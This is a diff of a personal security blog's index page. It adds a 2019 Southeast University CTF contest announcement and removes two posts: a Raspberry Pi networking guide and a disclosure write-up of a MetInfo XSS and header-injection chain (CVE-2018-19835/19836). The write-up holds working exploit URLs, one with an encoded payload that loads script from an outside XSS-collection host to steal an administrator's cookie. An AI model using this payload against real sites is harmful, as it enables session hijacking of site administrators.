+<li>[<a href="https://mp.weixin.qq.com/s/QtqLO-bF798TMUMi0EGSMA]">https://mp.weixin.qq.com/s/QtqLO-bF798TMUMi0EGSMA]</a>(## 简介</li>
+</ul>
+<p>由江苏省网络空间安全高校联盟指导，东南大学网络空间安全学院和东南大学网络安全联盟承办，北京永信至诚科技股份有限公司作为技术支持单位的江苏大学生网络安全精英邀请赛将于4月中旬在南京举行。此次比赛将由东南大学网络安全联盟负责命题，在永信至诚的网络安全攻防实战平台上进行，比赛对象为江苏省各高校的CTF战队。<br>本次比赛的一个目的为东南大学CTF战队面向全校招募新一届的队员，同时比赛也向江苏省各高校全面开放，我们在此次竞赛中将邀请多所江苏高校的新一届队员前往东南大学九龙湖校区共同切磋，共同进步，同时也借此机会选拔出真正对网络安全感兴趣，肯钻研的优秀后备人才，促进江苏高校网安人才的长远发展。</p>
+<h2 id="比赛时间-1"><a href="#比赛时间-1" class="headerlink" title="比赛时间"></a>比赛时间</h2><p>北京时间2019年4月13日9:00~17:00，共8小时         </p>
+<h2 id="报名方式-1"><a href="#报名方式-1" class="headerlink" title="报名方式"></a>报名方式</h2><p>截止4月11日24时         </p>
+<ul>
+<li>校内同学直接加入QQ群SUSCTF：429678492</li>
+<li>校外同学由主办方统一邀请</li>
+<li>各队信息（学校、队名、队员姓名、年级、手机号、email）统一发送至管理员处，等待管理员确认后为各队发放认证token</li>
+</ul>
+<h2 id="参赛对象-1"><a href="#参赛对象-1" class="headerlink" title="参赛对象"></a>参赛对象</h2><p>每队三人</p>
+<ul>
+<li>东南大学在校学生</li>
+<li>由主办方邀请的各个高校战队</li>
+</ul>
+<h2 id="比赛地点-1"><a href="#比赛地点-1" class="headerlink" title="比赛地点"></a>比赛地点</h2><p>东南大学九龙湖校区金智楼</p>
+<h2 id="赛制及排名-1"><a href="#赛制及排名-1" class="headerlink" title="赛制及排名"></a>赛制及排名</h2><ul>
+<li>比赛共分为两个积分榜，东南大学校内排名以及江苏省排名。</li>
+<li>采用动态分值，每道题目的分值会根据解出队伍的数量进行动态计分。</li>
+<li>最终排名根据每个队伍的总分确定，在多个队伍得分相同的情况下，越早达到这一分值的排名越高。</li>
+</ul>
+<h2 id="比赛模式-1"><a href="#比赛模式-1" class="headerlink" title="比赛模式"></a>比赛模式</h2><p>传统的<a href="https://ctf-wiki.github.io/ctf-wiki/">CTF(Capture the flag)</a>模式。每道赛题均内置1个flag，大多数情况下为SUSCTF{example_flag}。提交包含SUSCTF{}的完整flag来获得相应分值。特殊情况会在题目中标明。          </p>
+<p>包含如下题目类型：</p>
+<ul>
+<li>Web 漏洞挖掘和利用</li>
+<li>Pwn 漏洞挖掘利用</li>
+<li>Crypto 密码分析</li>
+<li>Re 二进制程序逆向分析</li>
+<li>Misc 电子取证，流量分析，信息隐藏…</li>
+</ul>
+<h2 id="规则-1"><a href="#规则-1" class="headerlink" title="规则"></a>规则</h2><ul>
+<li>参赛队伍如有任何违规行为，将被取消比赛资格</li>
+<li>禁止不同参赛队伍合作，或者共享flag、hint等任何比赛相关信息</li>
+<li>禁止攻击比赛平台，如果发现平台漏洞，请务必向我们报告</li>
+<li>禁止在比赛中妨碍其他队伍解题，例如当你解完一道题后对环境进行破坏</li>
+<li>禁止往比赛平台发送大量流量，没有任何题目需要使用扫描器</li>
+<li>禁止对提交的flag进行爆破</li>
+<li>获奖的队伍必须提交完整结题报告</li>
+<li>大赛主办方有权修改包括赛题、规则等一切事项</li>
+</ul>
+<h2 id="奖品-1"><a href="#奖品-1" class="headerlink" title="奖品"></a>奖品</h2><p>总排名：</p>
+<ul>
+<li>一等奖（1名）机械键盘*3+荣誉证书</li>
+<li>二等奖（2名）树莓派+荣誉证书</li>
+<li>三等奖（3名）300元书籍+荣誉证书</li>
+</ul>
+<p>校内排名：</p>
+<ul>
+<li>一等奖（1名）：机械键盘*3 + 荣誉证书</li>
+<li>二等奖（2名）：树莓派 + 荣誉证书</li>
+<li>三等奖（3名）：300元书籍 + 荣誉证书</li>
+</ul>
+<h2 id="组织机构-1"><a href="#组织机构-1" class="headerlink" title="组织机构"></a>组织机构</h2><ul>
+<li>指导单位：江苏省网络空间安全高校联盟</li>
+<li>承办单位：东南大学网络空间安全学院，东南大学网络安全联盟</li>
+<li>支持单位：北京永信至诚科技股份有限公司</li>
+</ul>
+<h2 id="往年风采-1"><a href="#往年风采-1" class="headerlink" title="往年风采"></a>往年风采</h2><ul>
+<li><a href="https://mp.weixin.qq.com/s/QtqLO-bF798TMUMi0EGSMA">https://mp.weixin.qq.com/s/QtqLO-bF798TMUMi0EGSMA</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/karaf-arbitrary-file-write/index.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1796,397 +2225,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/metinfo-reflected-xss-bypass-chrome/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/metinfo-reflected-xss-bypass-chrome/index.html" itemprop="url">
-                  metinfo reflected xss bypass chrome
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-12-04 17:47:07" itemprop="dateCreated datePublished" datetime="2018-12-04T17:47:07+08:00">2018-12-04</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Metinfo-latest-version-6-1-3-has-a-reflected-xss-vul-with-another-vul-which-can-cause-arbitrary-response-headers-set-we-can-bypass-chrome-xss-filter-CVE-2018-19835-and-CVE-2018-19836"><a href="#Metinfo-latest-version-6-1-3-has-a-reflected-xss-vul-with-another-vul-which-can-cause-arbitrary-response-headers-set-we-can-bypass-chrome-xss-filter-CVE-2018-19835-and-CVE-2018-19836" class="headerlink" title="Metinfo latest version(6.1.3) has a reflected xss vul, with another vul which can cause arbitrary response headers  set we can bypass chrome xss filter. [CVE-2018-19835 and CVE-2018-19836]"></a>Metinfo latest version(6.1.3) has a reflected xss vul, with another vul which can cause arbitrary response headers  set we can bypass chrome xss filter. [CVE-2018-19835 and CVE-2018-19836]</h1><blockquote>
-<p>Metinfo is an powerful cms used widely in china.<code>https://www.metinfo.cn/</code>  recently I find two vuls and combine them we can bypass chrome’s xss filter to affect administrators.</p>
-</blockquote>
-<h2 id="vul1"><a href="#vul1" class="headerlink" title="vul1"></a>vul1</h2><p>firstly, there exists an reflected XSS in metinfo latest version(6.1.3),</p>
-<p>url:<code>http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;lang_columnerr4=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;metcms=1</code></p>
-<p><img src="https://raw.githubusercontent.com/imagemlt/metinfo/master/reflected_xss_bypass_chrome/alert.png" alt=""><br>since no cookies protected with http-only we can directy use them.</p>
-<p>why does this vul exists?</p>
-<p>we check <code>/admin/column/move.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. </span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../login/login_check.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'global.func.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($foldyanzheng)&#123;</span><br><span class="line">	$metcms=<span class="string">''</span>;</span><br><span class="line">	$folder_m=$db-&gt;get_one(<span class="string">"SELECT * FROM $met_column WHERE foldername='$foldername' and lang='$lang'"</span>);</span><br><span class="line">	<span class="keyword">if</span>($folder_m)$metcms=$lang_columnerr4;</span><br><span class="line">	<span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-z0-9_-]+$/i'</span>,metdetrim($foldername)))$metcms=$lang_columnerr1;</span><br><span class="line">	<span class="keyword">echo</span> $metcms;</span><br><span class="line">	<span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>we only need <code>$folderyanzheng</code>&gt;0  and<code>$folder_m</code> is not null, we can get <code>$lang_columnerr4</code> directly shown in the dom .and just in <code>/include/common.inc.php</code> there exists an register of variables that can be controlled by us：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">		$_M[<span class="string">'form'</span>][$_key] = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>so we can controll the variable <code>$lang_columnerr4</code>.</p>
-<p>but we know vuls like this can only affect browsers that have no xss protections. how do we affect browsers like chrome that have powerfull xss filters? see next vul. </p>
-<h2 id="vul-2"><a href="#vul-2" class="headerlink" title="vul 2"></a>vul 2</h2><p>there exists an vul that enables you to set any headers in</p>
-<p><code>/include/interface/applogin.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../common.inc.php'</span>;</span><br><span class="line">$query = <span class="string">"UPDATE &#123;$met_config&#125; set value='&#123;$apppass&#125;' where name = 'met_apppass'"</span>;</span><br><span class="line">$db-&gt;get_one($query);</span><br><span class="line">header(<span class="string">"&#123;$serverurl&#125;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>in <code>common.inc.php</code> there exists an operation to register all variables which can be controlled by users;<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">		$_M[<span class="string">'form'</span>][$_key] = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>so here we can communicate this vul with vul1 to bypass chrome’s xss filter,because chrome’s xss filter donnot check  data from user’s cookie. </p>
-<h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p>Let administrator visit this address</p>
-<p><code>http://127.0.0.1:8888/include/interface/applogin.php?serverurl=Set-Cookie%3alang_columnerr4%3d123%253cimg%20src%3dasd%20onerror%3deval(String.fromCharCode(118,97,114,32,120,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,120,46,115,114,99,61,34,47,47,120,115,115,112,116,46,99,111,109,47,80,87,87,50,65,105,34,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,120,41,59))%3E;path=/</code></p>
-<p>we can see an responce header is set。<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/responce_headers.png?raw=true" alt="responce_headers.png"></p>
-<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>let the administrator visit </p>
-<p><code>http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;metcms=1</code></p>
-<p>here we can see the data in user’s cookie is shown in the dom<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/dom_loaded.png?raw=true" alt="dom_loaded.png"></p>
-<p>in my xss platform(platform to recieve xss data),we can see cookie of the manager is captured.<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/xss_back.png?raw=true" alt="xss_back.png"></p>
-<h3 id="just-want-an-alert"><a href="#just-want-an-alert" class="headerlink" title="just want an alert?"></a>just want an alert?</h3><p>first visit</p>
-<p><code>http://127.0.0.1:8888/include/interface/applogin.php?serverurl=Set-Cookie%3alang_columnerr4%3d123%253csvg/onload%3dalert(1)%3E;path=/</code></p>
-<p>secondly<br><code>http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;metcms=1</code><br>now you can see an alert<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/alert.png?raw=true" alt="alert.png"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/用树莓派zero-w做电脑的无线网卡/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/用树莓派zero-w做电脑的无线网卡/index.html" itemprop="url">
-                  用树莓派zero w做电脑的无线网卡
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-11-28 16:48:44" itemprop="dateCreated datePublished" datetime="2018-11-28T16:48:44+08:00">2018-11-28</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Step1-设置树莓派，启动usb0接口"><a href="#Step1-设置树莓派，启动usb0接口" class="headerlink" title="Step1 设置树莓派，启动usb0接口"></a>Step1 设置树莓派，启动usb0接口</h2><p>编辑<code>/boot/config.txt</code>，尾部添加：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dtoverlay=dwc2</span><br></pre></td></tr></table></figure>
-<p>编辑<code>/boot/cmdline.txt</code>,在<code>rootwait</code>后添加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modules-load=dwc2,g_ether</span><br></pre></td></tr></table></figure>
-<h2 id="Step2-启动树莓派后设置网络"><a href="#Step2-启动树莓派后设置网络" class="headerlink" title="Step2 启动树莓派后设置网络"></a>Step2 启动树莓派后设置网络</h2><p>编辑<code>/etc/network/interfaces</code>，内容修改为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">iface eth0 inet manual</span><br><span class="line"></span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">auto wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line">wpa-conf /boot/wpa.conf</span><br><span class="line"></span><br><span class="line">allow-hotplug usb0</span><br><span class="line">auto usb0</span><br><span class="line">iface usb0 inet static</span><br><span class="line">address 192.168.166.1</span><br><span class="line">netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
-<p>再安装dnsmasq</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install dnsmasq</span><br></pre></td></tr></table></figure>
-<p>编辑dnsmasq的配置文件<code>/etc/dnsmasq.conf</code>，去掉最后两行，改为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface=usb0</span><br><span class="line">bind-interfaces</span><br><span class="line">dhcp-range=192.168.166.2,192.168.166.250,24h</span><br></pre></td></tr></table></figure>
-<p>之后启动dnsmasq的开机自启动:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable dnsmasq</span><br></pre></td></tr></table></figure>
-<p>再创建端口转发用的脚本<code>forward.sh</code>,位置任意，内容为</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line">echo 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">iptables -t nat -A POSTROUTING  -o wlan0 -j MASQUERADE</span><br><span class="line">iptables -A FORWARD -i wlan0 -o usb0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i usb0 -o wlan0 -j ACCEPT</span><br></pre></td></tr></table></figure>
-<p>保存后在<code>/etc/rc.local</code>中在<code>exit 0</code>一行之前添加该脚本，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash 脚本位置</span><br></pre></td></tr></table></figure>
-<p>修改/boot/wpa.conf,添加需要连接的热点,l例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">network=&#123;</span><br><span class="line">	ssid=&quot;image&quot; #热点名称</span><br><span class="line">	key_mgmt=WPA-PSK </span><br><span class="line">	psk=&quot;xxxxxx&quot; #密码</span><br><span class="line">	priority=5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="enjoy-it"><a href="#enjoy-it" class="headerlink" title="enjoy it"></a>enjoy it</h2><p>重启后在mac和linux下可以直接识别该网路并且自动连接。需要修改热点只需要取出内存卡修改根目录下<code>/wpa.conf</code>文件即可。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2236,7 +2274,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">55</span>
+                    <span class="site-state-item-count">57</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
